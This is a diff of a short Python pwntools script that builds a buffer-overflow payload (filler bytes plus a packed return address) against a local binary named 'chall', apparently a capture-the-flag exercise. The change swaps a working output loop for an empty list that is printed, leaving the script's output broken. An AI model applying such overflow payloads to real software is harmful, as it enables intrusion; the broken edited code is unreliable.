@@ -1,5 +1,6 @@
 import pwn
 from pwnlib.util.packing import p64
+from itertools import zip_longest
 
 PWNSIZE = 64 // 4
 p = pwn.process("./chall")
@@ -38,7 +39,5 @@ assert (len(payload) < 18 * 4), "payload is too long already"
 payload += b"1" * ((19 * 4) + 4 - len(payload))
 payload += p64(address)
 print(str(payload, "ascii", "ignore"))
-split_up_payload = (int.from_bytes(cint)
-                    for cint in payload[::4])
-for integer in map(str, split_up_payload):
-    print(integer)
+split_up_payload = []
+print(split_up_payload)
